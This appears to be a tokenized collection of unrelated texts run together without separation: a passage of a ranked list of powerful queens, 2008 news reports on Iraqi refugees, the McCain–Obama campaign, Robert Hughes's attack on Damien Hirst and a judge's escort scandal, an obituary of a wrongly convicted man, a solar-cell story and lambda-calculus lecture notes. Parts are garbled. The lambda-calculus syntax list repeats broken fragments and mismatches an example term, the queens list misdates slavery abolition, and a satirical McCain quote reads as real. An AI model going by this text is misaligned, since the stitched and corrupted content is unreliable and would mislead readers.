She is best remembered for sponsoring Christopher Columbus ’s voyage to the Western Hemisphere , initiating the Spanish Inquisition , and unifying the remaining independent Spanish kingdoms into one nation .
Isabella I co-ruled with her husband , Ferdinand of Aragón , from 1474 up until her death in 1504 .
Isabella I , like her husband , was a devout Catholic .
Despite the fact that Spain had been a religiously diverse society with Catholics , Jews , and Muslims living together for many centuries , Isabella and Ferdinand believed it was their obligation to make Roman Catholicism the dominant religion of Spain .
As a result , in 1478 , Isabella and Ferdinand initiated the Spanish Inquisition .
Thousands of Jews who had in recent times converted to Roman Catholicism were looked upon suspiciously .
It is estimated that as many as 2,000 Jews were tortured , killed , or forced to leave the country during the Inquisition .
There were possibly as many as 40,000 Jews who chose to be baptized to avoid expulsion or persecution .
The remaining Muslim population in Spain was later targeted .
Isabella is known in the Catholic Church as “ Servant of God Isabella ” as she has achieved the first step towards becoming a Saint .
By the time Isabella and Ferdinand had come to power , the Reconquista was coming to an end .
Most of Spain , with the exception of the small Muslim kingdoms under the Nasrid Dynasty in Andalusia , had been unified and brought under Catholic control .
However , from 1485 to 1492 , Isabella and Ferdinand sought to complete the Reconquista process by conquering the remaining Muslim kingdoms and forcing the Muslim population into exile .
Also in 1492 , Isabella sponsored Christopher Columbus ’s voyages to the Western Hemisphere .
Columbus ’s exploration , with Isabella ’s support , contributed to the foundation of an overseas Spanish Colonial Empire that would bring great wealth and power to Spain overtime .
In other words , Isabella I contributed to making Spain a World Power .
4 Elizabeth I of England born : 1533 ; died : 1603
Even though past queens such as Empress Matilda , Lady Jane Grey , and Mary I had all ruled England in their own right , Elizabeth was truly the first crowned queen to successfully rule with absolute power .
She never married and has often been referred to as the “ Virgin Queen . ”
Elizabeth is best remembered for bringing the Renaissance to England .
She is also remembered for defeating the Spanish Armada and establishing Protestantism in England , replacing Roman Catholicism .
Elizabeth was the daughter of King Henry VIII and his second wife , Anne Boleyn and she ruled from 1558 until her death in 1603 .
She was last monarch of the Tudor Dynasty and her reign is known as the “ Elizabethan Era . ”
Elizabeth was a true intellectual and she was educated by renowned scholar , Roger Ascham .
As a student , she studied Greek , Latin , rhetoric , and philosophy ; she mastered all of these subjects .
Not surprisingly , when Elizabeth came to power , she transformed the English court into a center for poets , writers , musicians , and scholars .
She had connections to literary figures such as William Shakespeare , Edmund Spenser , and Christopher Marlowe .
Elizabeth also transformed England from a Catholic nation to a Protestant one .
Despite her Protestant sympathies , Elizabeth was known to be tolerant of all religions in England .
Her reign and religious transformation were highly contested by other Catholic European nations .
For years , Elizabeth ’s cousin , Mary , Queen of Scots , had felt she was the rightful heir to the English throne .
Mary had plotted for Elizabeth to be assassinated for years .
As a result , Mary lived much of her life in England under house arrest .
Finally , however , enough was enough and Mary was executed in 1587 .
Mary ’s execution and England ’s longtime support for the Protestants in the Spanish Netherlands , was the last straw .
In 1588 , Elizabeth ’s former brother - in - law , Phillip II of Spain , sent out his navel fleet , the Spanish Armada , to invade England , dethrone Elizabeth , and reestablish Roman Catholicism as the official religion .
Elizabeth , however , proved to be no shrinking violet ; she retaliated and won .
The defeat of the Armada left Spain bankrupt and Phillip II humiliated .
Elizabethan England , however , moved toward prosperity and gradually replaced Spain as a World Power .
3 Empress Dowager Cixi born : 1835 ; died : 1908
Cixi was probably most powerful woman in China since Empress Wu Zetian of the seventh century Zhou Dynasty .
In fact , Cixi may have been even more powerful than Wu Zetian .
She was an ambitious and conservative leader .
She opposed foreign influence and supported the Boxer Rebellion of 1900 .
Anyway , I place Cixi at third rank on this list .
Cixi was a consort of Emperor Xianfeng .
After her husband ’s death , she acted as regent for her son , Emperor Tongzhi , and later for her nephew , Guangxu .
Her rule began in 1861 and lasted until her death in 1908 .
Cixi was the last empress dowager of the ethnic - Manchu Qing Dynasty and the last empress dowager of China .
Cixi was sent to the Forbidden City in 1851 to be a concubine to Emperor Xianfeng .
In 1856 , Cixi gave birth to her son and the future emperor , Tongzhi .
After the birth of her son , Cixi ’s status was elevated in the royal court and she became a consort .
Emperor Xianfeng soon died in 1861 and Tongzhi became emperor with Cixi acting as regent .
Cixi , in reality , held the real power because she had total control over state affairs .
She surrounded herself with good advisors which also contributed to her success in maintaining power .
Internal chaos and foreign challenges plagued China during Cixi ’s time .
The country was suffering from the aftermath of the Second Opium War as well as the Taiping Rebellion .
Cixi appointed General Zeng Guofan to handle the Taiping situation , and as a result , the revolt was successfully crushed .
In 1881 , she dealt with the concern of too much foreign influence by ending China ’s so - called “ learn from foreigners ” program with the West .
As a result , she put a halt to sending Chinese children abroad to study and promoted hostility toward the West .
In 1898 , Emperor Guangxu , Cixi ’s nephew , felt China needed cultural , political , and political reform so he initiated what became known as the Hundred Days ’ Reform .
He began turning to the West .
Cixi put an end to this by launching a coup and placing Guangxu on house arrest .
The resentment toward Western influence continued with the Boxer Rebellion of 1900 in which Western Christian missionaries became targets for attack .
The rebellion failed , however , when Western powers intervened and stopped the revolt .
Ironically , between 1902 and 1908 , Cixi softened her views of the West and began encouraging the modernization of China .
I wonder what changed her mind .
2 Catherine II of Russia born : 1729 ; died : 1796
Catherine II , also known as Catherine the Great , I feel , deserves second rank on my list .
She ruled over Russia which was and still is the world ’s largest country geographically .
Catherine is remembered for bringing Enlightenment ideas to Russia as well expanding the empire .
Her rule lasted or 34 years , beginning in 1762 and ending with her death in 1796 .
Catherine was born in modern day Poland to a minor German prince of the Lutheran faith .
In 1744 , Catherine , already having mastered the Russian language , moved to Russia to marry Peter III who was heir to the Russian throne .
She also converted to Russian Orthodoxy in 1744 .
The marriage took place a year later and overtime it proved not to be a happy one for Catherine .
She saw her husband as arrogant and immature and , finally , in 1762 , Catherine conspired with the imperial guard to overthrow her husband in a palace coup .
As a result , Catherine was declared Empress of Imperial Russia .
As empress , Catherine continued the process of Westernizing Russia like Peter the Great and Tsarina Elizabeth had done before her .
She incorporated Enlightenment ideas into her politics , commissioned art , and created a successful foreign policy .
She also expanded the Russian Empire to the Black Sea by defeating the Ottoman Empire in two major wars .
Catherine ’s empire spanned over three continents : Europe , Asia , and part of North America .
It stretched from the Arctic Ocean to the North , the Black Sea to the South , Alaska and the Pacific to the East , and the Baltic Sea to the West .
Catherine reformed the system by creating a legislative commission in 1767 , introducing a system of local self - government in 1775 , and issuing the Charter to the Nobility in 1785 .
However , in 1773 , a Cossack named Yemelyan Ivanovich Pugachev , led a rebellion near the Ural Mountains .
This rebellion became known as the Pugachev Rebellion and its followers consisted of Cossacks and discontented ethnic minorities such as Bashkirs , Tatars , Kazakhs , and Kalmyks .
Pugachev claimed that he was the long - lost Peter III who some people believed escaped from being murdered eleven years before and sought to reclaim the throne .
The revolt infuriated Catherine and it contributed to her changes in policies .
Catherine crushed the Pugachev revolt as well as other revolts around the country , placed more restrictions on society , and made serfdom even more prevalent than before .
In other words , Catherine was n’t about to have her power threatened by anyone or anything .
1 Queen Victoria born : 1819 ; died : 1901
Ok , ranking number one on my list is Queen Victoria of the United Kingdom .
I would strongly consider Victoria being “ the ” most powerful woman in history because not only was she the queen of the United Kingdom in her own right , she was head of the vast colonial British Empire .
Victoria ’s empire covered 14.2 million square miles , spanning six continents , and controlling countries such as Australia , Canada , India , New Zealand , Nigeria , South Africa , and Sudan as well as many others .
Geographically , the British Empire was the largest colonial empire in the nineteenth century and the largest in history .
Victoria ruled over 400 to 458 million people during her reign .
Victoria inspired a worldwide trend known as the “ Victorian Era . ”
The Victorian Era influenced conservative religious and social attitudes , fashion , and politics in her country as well as in the United States and other nations abroad .
Victoria ’s reign began in 1837 and ended with her death in 1901 .
She ruled for 63 years ; the longest of any British monarch .
Despite having to share her power with the British Parliament , Victoria still exerted a certain amount of power over political decisions .
For example , Victoria played a role in appointing some cabinet ministers as well as a prime minister at one time .
She was even responsible for appointing particular ambassadors and bishops of the Church of England .
She also consulted regularly with her prime ministers by letter and in person .
Victoria contributed to massive political and social reforms in the United Kingdom as well as in the British Empire .
She supported an act of Parliament in 1838 which abolished slavery throughout all colonies in the British Empire .
In 1847 , she supported the Factory Act which reduced the working day in textile mills to ten hours .
Last but not least , Victoria supported the Third Reform Act of 1884 , which granted the right to vote to all male householders and effectively extended the vote to most British men .

WASHINGTON ( Reuters ) - The United States has surpassed its goal of admitting 12,000 Iraqi refugees this year and expects more , perhaps tens of thousands , next year , the State Department said on Friday .
The United States expects to admit a minimum of 17,000 Iraqi refugees in fiscal 2009 , which begins October 1 , the department ’s senior coordinator for refugees said .
Thousands more Iraqis and their family members could arrive through a special visa program for people who worked for the United States or its contractors .
“ I think you ’ll see the U.S. government admitting over the course of fiscal 2009 tens of thousands of Iraqis into the United States , ” coordinator James Foley told reporters .
Up to 3,000 could come from Baghdad , where the United States began interviews this year , he said .
So far this year , 12,118 Iraqi refugees have arrived and 1,000 more are booked to travel to the United States by the end of this month , when the U.S. fiscal year ends , he said .
That marks a huge leap from just 1,600 Iraqis admitted in the previous year .
That number drew widespread criticism from refugee groups that said Washington should do more to help millions of Iraqis who have fled instability and violence since the U.S. - led invasion in March 2003 .
The number is still lower than what some other countries have taken .
Sweden , a country of 9 million people , has admitted over 40,000 Iraqis since 2003 .
The U.N. High Commissioner for Refugees estimates 2 million Iraqis are living abroad , mostly in neighboring Jordan and Syria .
Some 2.5 million are internally displaced .
One refugee advocacy group , Human Rights First , said it welcomed the news Washington had met its target for Iraqi arrivals in 2008 but that the “ low ” goal of resettling 17,000 refugees in fiscal 2009 should be raised to at least 30,000 .
“ The number of Iraqi refugees we have welcomed to our shores is still just a fraction of those in need , ” said Amelia Templeton of the New York - based group .
She said the U.N. refugee agency estimated that 85,000 Iraqi refugees from the most vulnerable groups would need resettlement next year .
Foley called on the government of oil - rich Iraq to do more to help Iraqi refugees abroad as well as plan for returning Iraqis by addressing their needs for security , social services and property compensation .
So far , he said , Iraq had spent only about $ 25 million to help its refugees abroad , and provided about $ 200 million for an initiative to help returning refugees .
The latter amount was “ rather small , ” considering the number of Iraqi refugees and the improving security situation inside Iraq , Foley said .
“ One can not rule out in these situations the possibility that the refugees in large numbers themselves will decide it ’s time to go back , but will the Iraqi government be ready for that ?
That ’s what we have to prepare for I think , ” Foley said .
The United States spent over $ 318 million in humanitarian aid for Iraqi refugees this year , Foley said .
Washington sought support from other donors , “ particularly in the region , not to mention , the government of Iraq itself . ”
Foley said he was grateful that Syria , a country with which the United States has strained relations , had agreed to a new facility for refugee processing , which would enable Washington to handle larger numbers of refugees .
Robert Hughes , the world 's best - known champion of modern painting and sculpture , is publicly to lay much of the blame for the decline of contemporary art at the door of Damien Hirst .
In an uncompromising television essay about art and money that follows next week 's controversial London ' clearance ' sale of 223 of Hirst 's works , the Australian critic will claim they are ' absurd ' and ' tacky ' commodities .
Hughes 's film for Channel 4 argues it is ' a little miracle ' that Hirst 's 35ft bronze statue , Virgin Mother , could be worth £ 5 m and yet be made by someone ' with so little facility ' .
Calling Hirst 's famous shark in formaldehyde ' the world 's most over - rated marine organism ' , the critic will mount a lengthy attack on the artist for ' functioning like a commercial brand ' and make the case that both Hirst and his shark prove that art has lost all meaning separate from its price tag .
Hughes , 70 , became well known in Britain with his acclaimed BBC series The Shock of the New in 1980 , which made the theories behind modernism in art accessible to a wider audience .
But Hughes says he now fears he is a member of the ' last privileged generation ' to have visited an art gallery without thinking about the market value of the exhibits .
Hirst 's 1991 suspended tiger shark , The Physical Impossibility of Death in the Mind of Someone Living , is , Hughes judges , a ' tacky commodity ' , even though collector Charles Saatchi sold it for £ 8 m in 2004 .
' It is a clever piece of marketing , but as a piece of art it is absurd , ' Hughes says .
The common defence is that Hirst 's work mirrors and subverts modern decadence : ' Not so .
It is decadence , ' says Hughes .
His harsh verdict on Britain 's leading artist is a key part of the new film 's argument about the change Hughes has witnessed over 50 years as a New York - based art reviewer .
His film , The Mona Lisa Curse , opens with shots of Hirst 's diamond skull , For the Love of God , which sold for £ 50 m and is now owned by a consortium .
Hughes maintains that all works of art now operate in western culture much as celebrities do .
He dates the trend from 1962 when Leonardo da Vinci 's Mona Lisa left the Louvre in Paris to go on display in New York .
The long queues to see it turned a masterpiece into a mere spectacle , he argues .
The huge sums now regularly paid out by collectors at auctions , placing the lots out of the reach of public galleries , mean that art itself has been redefined .
The works , he suggests , are now like film stars , while the galleries have been reduced to the level of the limousines used to convey them to people .
' Art as spectacle loses its meaning , ' Hughes warns .
Grayson Perry , the Turner prize - winning potter and artist , welcomed Hughes 's intervention this weekend , although he admires some of Hirst 's work .
' I always enjoy Robert Hughes 's erudite grumpiness , ' Perry said .
' We get the art we deserve and Damien is the perfect artist of our times of fluff economies , New Labour and celebrity hype .
His skull was brilliant for its brazenness and for the debate it provoked .
His work has always been largely about money : I fear his accountant has become his most influential artistic adviser . '
Like Hughes , Perry is concerned about the way the significance of artworks is skewed by the price they attain in the market .
' What has changed is that the market , fuelled by glitzy new wealth , is becoming more powerful than the connoisseurs , museum curators and art academics whose consensus used to decide what was good art .
Hedge fund managers and Russian oligarchs are not necessarily known for their sophisticated good taste , ' said Perry .
Although Hughes has always been outspoken about BritArt , he has not attacked Hirst so explicitly before .
When Hughes was invited to speak at the Royal Academy of Arts dinner four years ago he made only a glancing , disdainful reference to Hirst , saying : ' A string of brush marks on a lace collar in a Velázquez can be as radical as a shark that an Australian caught for a couple of Englishmen some years ago and is now murkily disintegrating in its tank on the other side of the Thames .
More radical , actually .'
Ironically , this summer the Royal Academy , the venerable institution in Piccadilly , London , that helped make the names of the BritArt pack with the Sensation show of 1996 , is still waiting to hear whether or not Hirst will accept the honour of becoming a Royal Academician - the highest accolade for a working British artist .
Hirst 's fellow BritArt stars , Gary Hume and Tracey Emin , are already members of the academy , but the invitation to Hirst to join a club that he once called ' a big , fat and stuffy old pompous institution ' is significant .
The letter went out to Hirst in the early summer and he has until October to reply .
· ' The Mona Lisa Curse ' is to be shown on Channel 4 on 21 September at 6.30 pm
For a man who spent 19 years locked up for a murder he says he did n’t commit , DeWayne McKinney emerged from prison a man at peace .
He was n’t angry or bitter .
On weekends , he spoke at churches about the faith that carried him through those lost years .
He appeared at anti-death penalty conferences and told his story .
And when some money came his way from a legal settlement , he turned it into a multimillion - dollar business in the Hawaiian Islands , where he lived in an oceanfront home and could fall asleep listening to the crashing surf .
Movie studio executives were interested in turning his life story into a feature film .
But McKinney ’s remarkable story came to an end early Tuesday .

The 47 - year - old McKinney crashed the scooter he was riding into a wooden light pole in Honolulu about 12:30 a.m. and was thrown onto the pavement , said Caroline Sluyter , a spokeswoman for the Honolulu Police Department .
McKinney , who was not wearing a helmet , died at a local hospital .
“ He had a really beautiful soul .
He really did , ” said Denise Gragg , an assistant public defender who successfully obtained McKinney ’s release from prison .
“ The most amazing thing about him was the lack of anger he had when he came out .
. . .
He really was one of the best people I ’ve ever known . ”
McKinney made national news in 2000 after then - Orange County Dist .
Atty .
Tony Rackauckas obtained his release from prison , saying he had been wrongly convicted of a 1980 robbery - murder at a Burger King in Orange .

Prosecutors originally had sought the death penalty for McKinney , but he was sentenced to life in prison without parole after jurors deadlocked in the penalty portion of his trial .
McKinney , who was a member of a Los Angeles street gang , was arrested in December 1980 and charged with the killing of Walter Horace Bell , 19 , during a holdup at the fast - food restaurant .
Restaurant employees had picked out his mug shot and said he looked like the killer .
Nearly two decades later , however , another suspect emerged and Rackauckas agreed to help secure McKinney ’s release , even though the other suspect was never charged .
When McKinney was freed in January 2000 , he was forced to start his life from scratch .
He did n’t have a driver ’s license , Social Security number , savings account or a place to live .

Initially , he settled in Orange County , working at UC Irvine as an audio- visual technician and living for free in an apartment funded by a local businesswoman .
On weekends , McKinney spoke to church groups about how his faith carried him through some difficult times in prison .
He said he was n’t angry at the system that put him away .
“ Understanding what you truly lost , it makes you embrace what you have , ” McKinney said during a 2002 interview .
“ I ’m who I am today because of those 20 years . ”
Many people who came to know McKinney in the years after his release said they were inspired by the way he handled things .

McKinney eventually met the judge who sentenced him to prison and accepted a hug -- and an apology .
He shook the hand of the prosecutor who convicted him -- Rackauckas -- and even endorsed his reelection campaign .
“ He never complained about what he did n’t have .
He was always focused on what he did have .
He had life .
He had liberty , ” said Nancy Clark , the businesswoman who gave him an apartment to live in after his release .
“ I remember seeing him riding down the street on a bicycle , talking on a cellphone and thinking , ‘ Is n’t this amazing ? ’ ”
McKinney rubbed elbows with Hollywood celebrities and traveled to New York and Europe , visiting places that a few years earlier he read about in magazines at the prison library .
In 2002 , McKinney pocketed $ 1 million in a legal settlement with the Orange Police Department and started looking for ways to invest it .
At a prayer meeting , he heard someone explain that individuals could now buy ATMs and keep convenience fees as profit .

He installed the machines at bars , restaurants and shopping malls throughout the Hawaiian Islands , taking a profit each time a tourist or thirsty bar patron withdrew money .
In turn , he paid a cut to the business owners who gave him a place to install the machines .
“ To spend 19 years in prison and get out and do what he did , it was amazing , ” said Carl Stein , a business partner and friend .
“ He had this way with people .
They just could n’t say no to him . ”
Jeffrey Rawitz , a Los Angeles attorney who represented McKinney in the years after his release , said he got the news of his death Tuesday morning .
“ He really appreciated life in a way that most people ca n’t because of all the time he lost , ” Rawitz said .
“ He laughed easily .
He made friends easily and he appreciated every day he lived . ”

In recent years , McKinney had struggled with alcohol , Stein said .
He divorced and was forced to divide his ATMs with his former wife .
His struggles were not surprising considering the years he spent in California ’s toughest prisons .
Twice he was stabbed in prison .
At times , he strapped magazines around his torso to defend himself against attacks while he slept .
He tried to block out the reality by reading western novels by Louis L’Amour , which he collected in swaps with other inmates .
Within two days of his release , McKinney was summoned to the front of a crowded Lancaster church hall .

He held a microphone and spoke softly about a jailhouse conversion to Christianity and the faith that sustained him .
“ I was placed in an unspeakable situation for something I did n’t do , ” he began .
“ Two years ago , I met God .
I realized there ’s nothing he ca n’t do as long as we believe .
If I trust in him , he can take me anywhere . ”
During a 2004 interview in Hawaii , McKinney said he was much happier in Hawaii than he was in Southern California .
“ I finally found my place , ” he said .
“ I enjoy being able to breathe the fresh air , feel the wind on my face and know I ’m free . ”

Yes he did :
I am the former chairman of the Senate Committee on Commerce , Science and Transportation .
The Committee plays a major role in the development of technology policy , specifically any legislation affecting communications services , the Internet , cable television and other technologies .
Under my guiding hand , Congress developed a wireless spectrum policy that spurred the rapid rise of mobile phones and Wi-Fi technology that enables Americans to surf the web while sitting at a coffee shop , airport lounge , or public park .
You have to be one heck of a visionary to create wi-fi for computers when you do n’t even really know what a computer is .
Now that ’s American ingenuity , my friends .
( And Al Gore ’s supposed claim of helping to create the Internet is based on the same premise , passing legislation that created an environment in which it flourished .

Barack Obama is opening a clear lead over John McCain after polls at the weekend showed the public overwhelmingly awarding Friday night 's presidential debate to the Democratic candidate .
The polls suggest McCain did not benefit from suspending his campaign and flying to Washington last week to help deal with the financial crisis .
The gap could see an increase in more personal - and ugly - attacks on Obama .
An early sign of that came yesterday in a row over a dead soldier 's bracelet .
Obama was accused of wearing the bracelet against the wishes of the soldier 's mother .
With five weeks until the presidential election , Obama appears to have broken the impasse that had seen the two in a dead heat in polls over the past month .
A USA Today poll , published yesterday , showed 45 % of those questioned felt Obama had done better in the debate than McCain , who registered 34 % .
The public view is at odds with the media , which overwhelmingly judged it to be a draw .
Other polls , including the Rasmussen tracking poll , showed voters drifting towards Obama .
The Rasmussen poll put Obama on 50 % and McCain on 44 % , which would give the Democratic candidate a landslide victory .
McCain returned to the campaign trail yesterday alongside his vice - presidential running mate , Sarah Palin , for the first time since suspending his campaign last Wednesday .
In a speech in Ohio , McCain stuck to his main message of whether Obama was fit to be president , saying the Democratic candidate had always voted with the party and had shown no sign of putting his country first .
He also accused him of lying about tax plans in Friday 's debate .
As the election nears , the two campaigns are firing back more claims and denials , and at increasing speed .
Obama 's team 's denial on tax was out before McCain had completed his speech .
If Obama maintains his lead , the Republicans are almost certain to step up personal attacks on him .
In a column for the New York Times yesterday , the rightwing commentator William Kristol , editor of the Weekly Standard , offered suggestions on how McCain could win that included raising again Obama 's links with figures such as the Reverend Jeremiah Wright , the controversial cleric .
An early sign that the campaign could turn more personal was yesterday 's row over Obama 's possession of the bracelet of a US soldier killed in Iraq .
Stories quickly appeared on the internet suggesting the mother objected to Obama exploiting her son's death .
During the debate , McCain said a soldier 's mother had given him a bracelet .
" I 've got a bracelet too , from Sergeant ... from the mother of Sergeant Ryan David Jopek , given to me in Green Bay , " said Obama .
The mother , Tracy Jopek , told AP yesterday she was " ecstatic " that Obama had mentioned her son .
" I do n't understand how people can take that and turn it into some garbage on the internet , " she said .
She had asked Obama in February not to mention her son , but she felt it was appropriate on Friday in response to McCain .
Obama and McCain have established what they refer to as truth squads , each offering quick rebuttals to what they see as incorrect claims .
( CNN ) -- Sen .
John McCain has spent much of his two decades in Congress pushing deregulation , but the Republican presidential nominee is continuing his election year migration toward more government control of the economy as the nation faces one of its greatest financial crises since the Great Depression .
" I want the people in Ohio here to know that I have not forgotten the economy on Main Street , " McCain said during a campaign stop in Strongsville , Ohio , on Tuesday .
" Not Wall Street , not Washington , D.C. , but Main Street is the focus of our attention and our efforts . "
McCain 's latest populist message comes as Congress weighs a $ 700 billion bailout plan to prop up struggling financial firms beset by bad mortgages and head off a severe credit crunch .
McCain expressed doubts about the bailout during a campaign stop in Media , Pennsylvania , on Monday , in an attempt to help distance himself from the unpopular president .
" We need to put our country first and focus what 's best for Main Street .
It 's the excess and greed of Washington and Wall Street that got us in this situation to start with , " the Arizona Republican said .
Watch McCain 's bailout plan »
McCain 's populist bent has made some fellow Republicans unhappy , but McCain 's advisers say that is fine by them .
With the economic crisis dominating , McCain has one overriding political objective right now : connecting with anxious and angry voters in battleground states such as Pennsylvania and Ohio and convincing them he understands the financial pressures they face .
Watch the nominees ' aides debate the economy »
A McCain aide told CNN Monday night that the senator wo n't decide how he will vote until he sees the completed package being negotiated between the administration and Congress .
Despite McCain saying he was " uncomfortable " with the bailout plan on the campaign trail , Treasury Secretary Henry Paulson assured the Senate Democratic leadership that McCain would be " fine " with the measure and will vote for the bailout , a Democratic congressional leadership source told CNN .
Senate Democrats are worried that other Senate Republicans would vote against the bailout if McCain decided to oppose the measure , the source said .
Watch how the candidates are handling the crisis »
If Republicans do not back the bailout , it would force more Democrats to vote for the politically unpopular proposal , which President Bush and his administration says is desperately needed to end the financial crisis .
As part of his populist message , McCain is siding with Democrats in demanding a cap in compensation for CEOs for companies that participate in the government rescue to no more than $ 400,000 -- the amount the president makes .
" We can't have taxpayers footing the bill for bloated golden parachutes , " McCain said .
" The senior executives of any firm that 's bailed out by the Treasury should not be making more money than the highest - paid government office . "
iReport.com :
Is the financial crisis hurting your business ?
McCain is also expressing great concern about giving one person , Paulson , control of a $ 700 billion bailout package and has not decided whether he will vote for the measure , a senior aide to McCain said .
" Never before in the history of our nation has so much power and money been concentrated in the hands of one person , " McCain said .
" This arrangement makes me deeply uncomfortable .
And when we 're talking about a trillion dollars of taxpayer money , ' trust me ' just is n't good enough . "
Instead , McCain is proposing a bipartisan oversight board to supervise the rescue , suggesting three people for it : former Republican rival and businessman Mitt Romney , Barack Obama supporter and Wall Street heavyweight Warren Buffett and independent New York mayor and billionaire businessman Michael Bloomberg .
" We wo n't solve a problem caused by poor oversight with a plan that has no oversight , " McCain said .
McCain also has tried to burnish his image as a reformer during his response to the economic crisis .
" Americans have had enough of business as usual .
Americans have had enough of the cozy relationships between politicians and power brokers .
The days of me first , country second will end on November 4th when you vote for me and [ Governor Sarah ] Palin , " McCain told supporters in Pennsylvania .
CNN 's Dana Bash contributed to this report .

Which hooker (s ) did Judge Creepy creep out ?
See the slideshow and judge for yourself .
You 've gotta work pretty hard to get yourself booted from a lifetime appointment .
But Edward Nottingham , now - former Chief Federal Judge of the 10th Circuit Court , has done just that , resigning this week amid allegations that he 's a scumbag .
More technically speaking , he was facing possible congressional impeachment proceedings after being linked to a local escort agency being investigated by the FBI , and then allegedly telling one prostitute to lie about their encounters .
He is also being charged with one count of overestimating the loyalty of a hooker .
The escort service in question operated as both Denver Players and Denver Sugar , and it boasted a going rate of between $ 200 and $ 300 per hour .
So , we wondered :
What exactly does a $ 300 - an - hour hooker look like ?
And is she really worth $ 297.50 more than the dude who so cordially offers us his services on Colfax every morning ?
To answer this pressing question , we did some digging on the old Waybac Machine , unearthing the archives of www.denverplayers.com and www.denversugar.com, both of which were shut down in January after a law enforcement raid .
We found these photos of some then - available escorts , including " Kelsie , " " Courtney " and " Su Ling . "
And we 're trying to figure out just which kind of hooker a President Bush - appointed judge likes .

The ultra - thin solar cells that could generate power through windows
Solar cells that are transparent enough to be used to tint windows on buildings or cars , have been developed by U.S researchers .
Conventional solar cells are bulky and rigid but lightweight cells are usually far less efficient .
However , a new method of making the silicon - based devices could create thin , flexible cells without any trade - offs .
Brittle wafers of silicon are sliced into ultra - thin pieces and carefully ' printed ' onto a malleable surface .
The cells are so flexible they can be rolled around a pencil .
Cars may one day incorporate ultra - thin solar cells into tinted windows
' You can make ( the solar cells ) in the form of a gray film that could be added to architectural glass , ' said lead researcher John Rogers of the University of Illinois .
' It opens up spaces on the fronts of buildings as opportunities for solar energy . '
The new technology could be used on car windows , generating enough electricity to power the GPS or air conditioning .
Solar cells , which convert solar energy into electricity , are in high demand because of higher oil prices and concerns over climate change .
Many international companies are making thin - film solar cells , but they are typically less efficient at converting solar energy into electricity than conventional cells .
Rogers said his technology uses conventional single crystal silicon .
' It 's robust .
It 's highly efficient .
But in its current form , it 's rigid and fragile , ' he said in the journal Nature Materials .
Rogers ' team uses a special etching method that slices chips off the surface of a bulk silicon wafer .
The sliced chips are 10 to 100 times thinner than the wafer , and the size can be adapted to the application .
Once sliced , a device picks up the bits of silicon chips ' like a rubber stamp ' and transfers them to a new surface material , Rogers said .
' These silicon solar cells become like a solid ink pad for that rubber stamp .
The surface of the wafers after we 've done this slicing become almost like an inking pad , ' he said .
' We just print them down onto a target surface . '
The final step is to electrically connect these cells to get power out of them , he said .
Adding flexibility to the material would make the cells far easier to transport .
Rogers envisions the material being ' rolled up like a carpet and thrown on the truck . '
The technology has been licensed to a startup company called Semprius Inc in the U.S .

The Lambda Calculus
Lambda calculus is a notation for describing mathematical functions and programs .
It is a mathematical system for studying the interaction of functional abstraction and functional application .
It captures some of the essential , common features of a wide variety of programming languages .
Because it directly supports abstraction , it is a more natural model of universal computation than a Turing machine is .
Syntax
a variable x ∈ Var , where Var is a countably infinite set of variables ;
, where is a countably infinite set of variables ; an application , a function e 0 applied to an argument e 1 , usually written e 0 e 1 or e 0 ( e 1 ) ; or
, a function applied to an argument , usually written or ; or a lambda abstraction , an expression λx.e representing a function with input parameter x and body e .
Where a mathematician would write x ↦ x2 , or an SML programmer would write fn x => x*x , in the λ - calculus we write λx.x2 .
In BNF notation ,
e ::= x | λx.e | e 0 e 1
Parentheses are used just for grouping ; they have no meaning on their own .
Like other familiar binding constructs from mathematics ( e.g. , sums , integrals ) , lambda terms are greedy , extending as far to the right as they can .
Therefore , the term λx. λy. y is the same as λx . ( x ( λy.y ) ) , not ( λx.x ) ( λy.y ) .
As in SML , application terms are left - associative , so x y z is the same thing as ( x y ) z .
For simplicity , multiple variables may be placed after the lambda , and this is considered shorthand for having a lambda in front of each variable .
For example , we write λxy.e as shorthand for λx.λy.e.
This shorthand is an example of syntactic sugar .
The process of removing this shorthand is currying , just as in SML , and adding it is called uncurrying .
We can apply a curried function like λx.λy.x one argument at a time .
Applying it to one argument results in a function that takes in a value for x and returns a constant function , one that returns the value of x no matter what argument it is applied to .
As this suggests , functions are just ordinary values , and can be the results of functions or passed as arguments to functions ( even to themselves ! ) .
Thus , in the lambda calculus , functions are first - class values : lambda terms serve both as functions and data .
Variables
Just as in SML , occurrences of variables in a term can be bound or free .
The term λx.e binds all the free occurrences of x in e .
The scope of x is e .
This is called lexical scoping , because the variable 's scope is defined by the text of the program .
It is “ lexical ” because it is possible to determine its scope before the program runs , just by inspecting the program text .
A term is closed if all variables are bound .
A term is open if it is not closed .
Substitution and β-reduction
How do we run a λ- calculus program ?
The main computational rule is β-reduction , which we are already familiar with from SML .
This rule applies whenever there is a subterm of the form ( λx.e ) e ' representing the application of a function λx.e to an argument e' .
To perform β- reduction , we substitute the argument e' for all free occurrences of the formal parameter x in the body e , obtaining e{e ' / x} .
This agrees with SML and corresponds to our intuition for what the function λx.e means .
We have to be a little careful ; we cannot always substitute e' blindly for x in e , because bad things could happen which could alter the meaning of expressions in undesirable ways .
We only want to replace the free occurrences of x within e , because any other occurrences are bound to a different binding ; they are really different variables .
There are some additional subtleties to substitution when e' is not closed , in particular the problem of variable capture .
The β reduction ( λx.e ) e ' → e{e ' / x} is the basic computational step of the λ-calculus .
In the pure λ- calculus , we can start with a term and perform β-reductions on subterms in any order .
However , for modeling programming languages , it is useful to restrict which β reductions are allowed and in what order they can be performed .
Higher - order functions
The lambda calculus is all about functions .
It 's easy to define higher - order functions that operate on other functions .
For example , we can define a function COMPOSE that operates on two functions f and g to produce the composition of f and g , written f∘g .
The definition is that ( f∘g ) ( x ) = f ( g( x ) ) , which we can then directly abstract :
COMPOSE = λfg. λx.f ( g x )
We can use COMPOSE to define a higher - order function TWICE that operates on a function f to produce a new function that applies f twice :
TWICE = λf. COMPOSE f f
= λf. ( λfg. λx.f ( g x ) ) f f
= λf. λx.f ( f x ) ( by β reduction inside the lambda abstraction )
If we want to define a function that applies another function four times , we can just apply TWICE to itself : FOURTIMES = TWICE TWICE .
Call - by - Name and Call - by - Value
In general there may be many possible β- reductions that can be performed on a given term .
How do we choose which beta reductions to perform next ?
Does it matter ?
A specification of which β-reduction to perform next is called a reduction strategy .
Under a given reduction strategy , a value is a term on which no β-reductions are permitted .
chosen reduction strategy .
For example , λx.x would always be value , whereas ( ( λx.x ) 1 ) would not be under usual reduction strategies .
Most real programming languages based on the λ- calculus , such as SML , use a reduction strategy known as call by value ( CBV ) , in which functions may only be applied to ( called on ) values .
